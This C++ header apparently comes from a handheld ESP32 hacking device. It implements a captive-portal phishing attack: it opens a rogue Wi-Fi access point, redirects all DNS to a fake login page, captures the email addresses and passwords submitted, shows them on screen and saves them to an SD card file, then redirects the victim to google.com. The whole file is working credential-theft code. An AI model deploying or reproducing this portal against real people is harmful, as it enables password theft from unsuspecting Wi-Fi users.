#ifndef WEB_PORTAL_H
#define WEB_PORTAL_H

#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include "WebAssets.h"
#include "config.h"

extern TFT_eSPI tft;

class WebPortal {
public:
    void start(String ssid) {
        WiFi.mode(WIFI_AP);
        WiFi.softAP(ssid.c_str());
        
        // Setup DNS to redirect everything to us
        dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
        dnsServer.start(53, "*", WiFi.softAPIP());

        // Setup Web Server
        server.on("/", [this](){
            server.send(200, "text/html", index_html);
        });
        
        server.on("/login", HTTP_POST, [this](){
            if (server.hasArg("email") && server.hasArg("password")) {
                String email = server.arg("email");
                String pass = server.arg("password");
                logCredentials(email, pass);
                server.send(200, "text/html", "<h1>Verifying...</h1><script>setTimeout(function(){window.location.href='http://google.com';}, 2000);</script>");
            } else {
                server.send(400, "text/plain", "Bad Request");
            }
        });
        
        server.onNotFound([this](){
            server.send(200, "text/html", index_html);
        });

        server.begin();
        
        tft.fillScreen(TFT_DGH); // Dark green background
        tft.setTextColor(TFT_WHITE, TFT_DGH);
        tft.setCursor(10, 10);
        tft.println("CAPTIVE PORTAL ACTIVE");
        tft.print("SSID: "); tft.println(ssid);
        tft.println("\nIP: 192.168.4.1");
        tft.println("Waiting for clients...");
        tft.println("Press LEFT/SEL to Stop");
        
        runLoop();
    }

private:
    DNSServer dnsServer;
    WebServer server{80};

    void runLoop() {
        while(digitalRead(BTN_SELECT) == HIGH && digitalRead(BTN_LEFT) == HIGH) { // Loop until select/back pressed
            dnsServer.processNextRequest();
            server.handleClient();
            delay(10);
        }
        stop();
    }

    void stop() {
        server.stop();
        dnsServer.stop();
        WiFi.softAPdisconnect(true);
        tft.fillScreen(TFT_BLACK);
    }

    void logCredentials(String email, String pass) {
        // Visual feedback - Show actual creds
        tft.fillScreen(TFT_ORANGE); // Alert background
        tft.setTextColor(TFT_WHITE, TFT_ORANGE);
        tft.setCursor(10, 10);
        tft.setTextSize(2);
        tft.println("CREDENTIALS LOGGED");
        
        tft.setTextSize(2);
        tft.setCursor(10, 50);
        tft.println("Email:");
        tft.setCursor(10, 70);
        tft.println(email);
        
        tft.setCursor(10, 110);
        tft.println("Pass:");
        tft.setCursor(10, 130);
        tft.println(pass);
        
        tft.setTextSize(1);
        tft.setCursor(10, 200);
        
        File f = SD.open("/creds.txt", FILE_APPEND);
        if (f) {
             f.print("Email: "); f.print(email);
             f.print(" | Pass: "); f.println(pass);
             f.close();
             tft.println("Saved to SD:/creds.txt");
        } else {
             tft.println("SD Error");
        }
        
        tft.println("Press SELECT to continue");
        
        // Wait for acknowledgement
        while(digitalRead(BTN_SELECT) == HIGH && digitalRead(BTN_LEFT) == HIGH) delay(10);
        while(digitalRead(BTN_SELECT) == LOW || digitalRead(BTN_LEFT) == LOW) delay(10);
        
        // Redraw waiting screen
        tft.fillScreen(TFT_DGH);
        tft.setCursor(10, 10);
        tft.setTextSize(1);
        tft.println("CAPTIVE PORTAL ACTIVE");
        tft.println("Waiting for clients...");
        tft.println("Press LEFT/SEL to Stop");
    }
};

extern WebPortal webPortal;

#endif
